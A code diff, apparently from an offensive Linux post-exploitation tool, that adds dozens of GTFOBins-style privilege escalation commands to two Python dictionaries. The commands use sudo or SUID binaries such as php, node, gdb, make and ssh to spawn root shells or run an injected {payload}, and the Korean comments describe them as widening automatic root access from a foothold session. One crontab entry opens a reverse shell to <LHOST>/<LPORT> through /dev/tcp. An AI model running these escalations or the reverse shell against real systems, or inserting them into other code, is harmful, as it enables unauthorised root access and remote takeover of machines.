@@ -48,6 +48,30 @@ _GTFO: dict[str, dict[str, str]] = {
     "docker": {"sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
     "apt": {"sudo": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"},
     "mount": {"sudo": "# (조건부) sudo mount 로 쓰기가능 마운트·nosuid 우회 점검"},
+    # ── 확장(표준 GTFOBins — 자동 root 커버리지 확대) ──
+    "php": {"sudo": "sudo php -r 'system(\"/bin/sh\");'",
+            "suid": "{bin} -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"},
+    "node": {"sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"},
+    "lua": {"sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'"},
+    "gdb": {"sudo": "sudo gdb -nx -ex '!sh' -ex quit"},
+    "make": {"sudo": "sudo make -s --eval=$'x:\\n\\t-/bin/sh 0<&1'"},
+    "taskset": {"sudo": "sudo taskset 1 /bin/sh", "suid": "{bin} 1 /bin/sh -p"},
+    "nice": {"sudo": "sudo nice /bin/sh"},
+    "stdbuf": {"sudo": "sudo stdbuf -i0 /bin/sh"},
+    "timeout": {"sudo": "sudo timeout 7d /bin/sh"},
+    "flock": {"sudo": "sudo flock -u / /bin/sh"},
+    "setarch": {"sudo": "sudo setarch $(uname -m) /bin/sh"},
+    "xargs": {"sudo": "sudo xargs -a /dev/null sh"},
+    "busybox": {"sudo": "sudo busybox sh"},
+    "dash": {"sudo": "sudo dash", "suid": "{bin} -p"},
+    "ash": {"sudo": "sudo ash", "suid": "{bin} -p"},
+    "zsh": {"sudo": "sudo zsh"},
+    "ksh": {"sudo": "sudo ksh"},
+    "cpulimit": {"sudo": "sudo cpulimit -l 100 -f -- /bin/sh"},
+    "ed": {"sudo": "sudo ed\n# 그 뒤 '!/bin/sh'"},
+    "rvim": {"sudo": "sudo rvim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"},
+    "crontab": {"sudo": "sudo crontab -e\n# 에디터에서 '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'"},
+    "ssh": {"sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"},
 }
 # capability 상승(= getcap 에서 cap_setuid+ep) 가능한 인터프리터.
 _CAP_SETUID = {
@@ -92,6 +116,25 @@ _ONESHOT: dict[str, dict[str, str]] = {
     "node": {"cap": "{bin} -e 'process.setuid(0);require(\"child_process\")"
                     ".execSync(\"{payload}\",{stdio:\"inherit\"})'"},
     "docker": {"sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt sh -c '{payload}'"},
+    # ── 확장(표준 GTFOBins one-shot — 발판 세션에서 비대화형 상승) ──
+    "php": {"sudo": "sudo php -r 'system(\"{payload}\");'",
+            "suid": "{bin} -r 'posix_setuid(0);system(\"{payload}\");'"},
+    "node": {"sudo": "sudo node -e 'require(\"child_process\").execSync(\"{payload}\",{stdio:\"inherit\"})'"},
+    "lua": {"sudo": "sudo lua -e 'os.execute(\"{payload}\")'"},
+    "gdb": {"sudo": "sudo gdb -nx -ex 'py import os;os.system(\"{payload}\")' -ex quit"},
+    "taskset": {"sudo": "sudo taskset 1 {payload}", "suid": "{bin} 1 /bin/sh -pc '{payload}'"},
+    "nice": {"sudo": "sudo nice {payload}"},
+    "stdbuf": {"sudo": "sudo stdbuf -i0 {payload}"},
+    "timeout": {"sudo": "sudo timeout 7d {payload}"},
+    "flock": {"sudo": "sudo flock -u / sh -c '{payload}'"},
+    "setarch": {"sudo": "sudo setarch $(uname -m) {payload}"},
+    "xargs": {"sudo": "sudo xargs -a /dev/null sh -c '{payload}'"},
+    "busybox": {"sudo": "sudo busybox sh -c '{payload}'", "suid": "{bin} sh -c '{payload}'"},
+    "dash": {"sudo": "sudo dash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
+    "ash": {"sudo": "sudo ash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
+    "zsh": {"sudo": "sudo zsh -c '{payload}'"},
+    "ksh": {"sudo": "sudo ksh -c '{payload}'"},
+    "cpulimit": {"sudo": "sudo cpulimit -l 100 -f -- sh -c '{payload}'"},
 }
 
 
